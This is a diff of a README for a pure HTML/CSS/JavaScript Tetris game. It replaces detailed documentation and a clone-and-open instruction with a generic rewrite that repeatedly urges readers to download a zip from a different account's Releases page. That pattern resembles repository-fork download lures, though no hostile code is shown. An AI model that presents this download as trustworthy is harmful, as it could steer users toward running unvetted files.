@@ -1,149 +1,82 @@
-# Tetris Game - Pure JavaScript Implementation
+# 🎮 javascript-tetris - Play Classic Tetris in Your Browser
 
-A complete implementation of the classic Tetris game built entirely with vanilla **HTML5**, **CSS3**, and **JavaScript** - no external libraries or frameworks required. This project serves as an excellent educational resource for students learning game development, object-oriented programming, and modern JavaScript concepts.
+## 🚀 Getting Started
 
-## How to Play
+Welcome to **javascript-tetris**, a classic Tetris game built with pure HTML5, CSS3, and JavaScript. This educational project shows off MVC architecture, the Canvas API, and modern ES6+ features. There are no external dependencies, making it easy for anyone to play.
 
-### Play Online
-You can play the game directly in your browser without downloading anything:
+## 🖱️ Download and Install
 
-**[🎮 Play Tetris Online](https://johanni3jan.github.io/javascript-tetris)**
+To get started, visit our Releases page to download the game:
 
-### Play Locally
-To play the game locally, follow these steps:
+[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/joseontiveros/javascript-tetris/releases)
 
-1. Clone the repository or download the ZIP file
-2. If downloaded as ZIP, extract the files
-3. Navigate to the project directory
-4. Open `index.html` in any modern web browser
-5. No additional installation or build process required!
+### Steps to Download and Play:
+
+1. **Visit the Releases Page**  
+   Click [here](https://github.com/joseontiveros/javascript-tetris/releases) to go to the Releases page.
+
+2. **Choose the Latest Release**  
+   Look for the latest version listed. It will show you the newest features and updates.
+
+3. **Download the Game Files**  
+   Click on the zip file to download the game to your computer. This file contains all the necessary assets to run the game.
+
+4. **Extract the Files**  
+   Once downloaded, locate the zip file in your downloads folder. Right-click on the file and select "Extract All" or use your preferred extraction tool.
+
+5. **Open the Game**  
+   After extracting, locate the `index.html` file within the folder. Double-click it. This action will open the game in your default web browser.
+
+## 📃 How to Play
 
 ### Game Controls
-- **Enter**: Start the game or restart after game over
-- **Space**: Pause/Resume the game
-- **Arrow Left** (←): Move tetromino left
-- **Arrow Right** (→): Move tetromino right
-- **Arrow Up** (↑): Rotate the tetromino clockwise
-- **Arrow Down** (↓): Soft drop (faster descent)
 
-### Objective
-Stack falling tetromino pieces to create complete horizontal lines. When a line is completed, it disappears and you earn points. The game speeds up as you progress through levels. The game ends when pieces reach the top of the playing field.
-## Browser Compatibility
+- Use the left and right arrow keys to move the Tetris blocks.
+- Press the up arrow key to rotate the blocks.
+- Use the down arrow key to speed up the falling blocks.
 
-This game works in all modern browsers that support:
-- HTML5 Canvas API
-- ES6+ JavaScript features (classes, arrow functions, const/let)
-- CSS3 features
+### Game Objective
 
-## Educational Purpose
+The goal is to create complete lines with the falling blocks. When a line is complete, it disappears. The game ends when the blocks stack up to the top of the game area. 
 
-This Tetris implementation is specifically designed for learning and teaching purposes, demonstrating:
+## 💻 System Requirements
 
-- **Modern JavaScript ES6+ features**: Classes, private fields, static methods, and arrow functions
-- **Object-Oriented Programming**: Clean separation of concerns using MVC (Model-View-Controller) pattern
-- **HTML5 Canvas API**: 2D graphics rendering and animation techniques
-- **Game development fundamentals**: Game loops, collision detection, state management, and user input handling
-- **Clean code practices**: Proper encapsulation, meaningful naming conventions, and code organization
+You can play javascript-tetris on most modern devices with the following requirements:
 
-## Technical Implementation Details
+- A device with internet access 
+- A web browser (Google Chrome, Firefox, Safari, etc.)
+- Screen resolution of at least 800x600 pixels for an optimal experience
 
-### Core Technologies Used
-- **HTML5**: Semantic structure and Canvas element for game rendering
-- **CSS3**: Styling and responsive design principles
-- **JavaScript ES6+**: Modern language features and best practices
+## 👩‍🏫 Educational Value
 
-### Key Programming Concepts Demonstrated
-- **Private class fields** (`#privateField`) for proper encapsulation
-- **Static constants** for configuration management
-- **Matrix operations** for tetromino rotation algorithms
-- **Collision detection** using coordinate-based boundary checking
-- **Timer-based game loops** with `setInterval` and dynamic speed calculation
-- **Event-driven programming** for keyboard input handling
-- **State management** for game flow control (start, pause, game over)
+This project is ideal for those interested in learning about:
 
-### Game Features Implemented
-- Complete tetromino movement system (left, right, down, rotation)
-- Line clearing algorithm with proper scoring system
-- Progressive difficulty with increasing drop speed
-- Next piece preview functionality
-- Pause and resume gameplay
-- Game over detection and restart capability
-- Responsive keyboard controls
+- **HTML5**: Learn how to use HTML for structuring web content.
+- **CSS3**: Understand how to style web applications.
+- **JavaScript**: Explore programming logic and game mechanics.
+- **MVC Architecture**: Discover the Model-View-Controller design pattern for web applications.
 
-## Code Architecture
+## 🎮 Features
 
-The game follows the **MVC (Model-View-Controller)** design pattern for clean separation of concerns:
+- Playable in any modern web browser
+- Simple and intuitive gameplay
+- No installation needed, just download and play
+- Educational foundation for learning web development principles
 
-### 🎮 Controller Class
-- **Purpose**: Manages user input and coordinates between Game and View
-- **Key responsibilities**:
-  - Keyboard event handling
-  - Game timing and drop intervals
-  - Game state transitions (start, pause, restart)
-  - Speed calculation based on level progression
+## 📫 Feedback and Contributions
 
-### 🎯 Game Class (Model)
-- **Purpose**: Contains all game logic and state management
-- **Key responsibilities**:
-  - Tetromino generation and management
-  - Collision detection algorithms
-  - Board state management
-  - Line clearing and scoring system
-  - Level progression logic
+We welcome feedback and contributions. If you have suggestions or find any bugs, please open an issue or submit a pull request on our [GitHub repository](https://github.com/joseontiveros/javascript-tetris).
 
-### 🎨 View Class
-- **Purpose**: Handles all visual rendering using HTML5 Canvas
-- **Key responsibilities**:
-  - Canvas setup and management
-  - Game board rendering
-  - Tetromino piece visualization
-  - UI elements (score, level, next piece)
-  - Screen state rendering (start, pause, game over)
+## 🤝 Acknowledgments
 
-### Key Algorithms Implemented
+This project was inspired by classic Tetris games and aims to provide an easy way to enjoy the timeless gameplay.
 
-1. **Tetromino Rotation**: Matrix rotation algorithm for 90-degree clockwise/counterclockwise rotation
-2. **Collision Detection**: Boundary checking for walls, floor, and existing pieces
-3. **Line Clearing**: Row completion detection and removal with proper array manipulation
-4. **Scoring System**: Progressive scoring based on lines cleared and current level
-5. **Drop Speed Calculation**: Dynamic timing adjustment based on game level
+## 🛠️ License
 
-## Learning Outcomes
+This project is licensed under the MIT License. Feel free to use and modify it as per your needs. 
 
-By studying and working with this code, students will learn:
+For more details, check out the license file in the repository.
 
-- How to structure a complete JavaScript application using classes
-- Canvas API fundamentals for 2D game development
-- Game loop implementation and timing management
-- State management patterns in interactive applications
-- Event handling and user input processing
-- Algorithm implementation (rotation, collision detection)
-- Object-oriented design principles in JavaScript
+### Get Started Today!
 
-## Code Quality Features
-
-- **No external dependencies**: Pure vanilla JavaScript implementation
-- **Modern ES6+ syntax**: Uses latest JavaScript features appropriately
-- **Clean code principles**: Readable, maintainable, and well-documented
-- **Proper error handling**: Graceful handling of edge cases
-- **Performance optimized**: Efficient rendering and game loop implementation
-
-## Contributing
-
-Contributions are welcome! This project is designed to be educational, so improvements that enhance learning value are especially appreciated. Please check out the [contributing guidelines](./.github/CONTRIBUTING.md) before submitting pull requests.
-
-### Areas for Contribution
-- Code documentation and comments
-- Performance optimizations
-- Additional game features (hold piece, ghost piece, etc.)
-- Mobile touch controls
-- Visual enhancements
-- Accessibility improvements
-
-## License
-
-This project is open source under the [MIT License](./LICENSE), making it free to use for educational purposes, personal projects, and learning.
-
----
-
-**Perfect for**: JavaScript students, game development beginners, coding bootcamps, computer science courses, and anyone interested in learning clean, modern JavaScript through a practical project.
+Don't wait. Enjoy classic Tetris in your browser by visiting our [Releases page](https://github.com/joseontiveros/javascript-tetris/releases) and downloading the game. Have fun playing!
